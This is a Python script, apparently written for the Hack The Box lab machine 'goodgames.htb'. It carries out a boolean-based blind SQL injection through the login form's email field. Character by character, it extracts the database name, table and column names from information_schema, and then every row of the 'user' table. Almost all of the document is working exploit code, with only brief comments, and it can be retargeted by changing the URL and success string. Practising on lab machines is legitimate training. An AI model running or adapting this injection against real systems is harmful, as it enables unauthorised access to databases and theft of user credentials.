import requests
#import urllib.parse

url = 'http://goodgames.htb/login'
payload = "1=1"#urllib.parse.quote("' or 1=1 -- -")
proxies = {'http':'http://127.0.0.1:8080'}

def test_sql_command(payload):
	data = {'email':"' or {} -- -".format(payload), 'password':''}

	res = requests.post(url,data = data)#, proxies = proxies)
	#print(res.text)
	if 'Login Success' in res.text:
		return True
	return False

def test_output_length(sql_command, limit=100):
	for i in range(1,limit+1):
		if test_sql_command('length({})={}'.format(sql_command,i)):
			return i
	return 0


def guess_output(sql_command,out_len,char_list):
	output = ''
	for i in range(1,out_len+1):
		for char in char_list:
			if test_sql_command('ascii(substring({},{},1))={}'.format(sql_command,i,ord(char))):
				output += char
				break
	return output

def get_schema(table_or_db, command_format,char_list,limit=100):
	name_len = []
	for i in range(limit):
		tmp_len = test_output_length(command_format.format(table_or_db,i))
		if tmp_len > 0:
			name_len.append(tmp_len)
		else:
			break
	names = []
	for i in range(len(name_len)):
		name = guess_output(command_format.format(table_or_db,i),name_len[i],char_list)
		names.append(name)
	return names

import string
search_list = string.printable[:62] 

# ## get database length
db_command_formate = 'database()'
dbname_len = test_output_length(db_command_formate)
dbname = guess_output(db_command_formate,dbname_len,search_list)
print('database: ',dbname)

### Get tables in database
table_command_format = '(select table_name from information_schema.tables where table_schema="{}" limit {},1)'
table_name = get_schema(dbname,table_command_format,search_list)
print('tables: ',table_name)


"""This section is to retrieve table contents once knowing the table name"""
###Get columns of one table
table = 'user'
column_command_format = '(select column_name from information_schema.columns where table_name="{}" limit {},1)'
column_names = get_schema(table,column_command_format,search_list)
print('columns in table "{}": '.format(table), column_names)

### Dump data in table after knowing column names
valid_chars= string.printable
table_data = []
data_command_format = '(select {} from {} limit {},1)'.format('{}',table,'{}')
for i in range(len(column_names)):
	column_data = get_schema(column_names[i],data_command_format,valid_chars)
	print(column_names[i],column_data)
	table_data.append(column_data)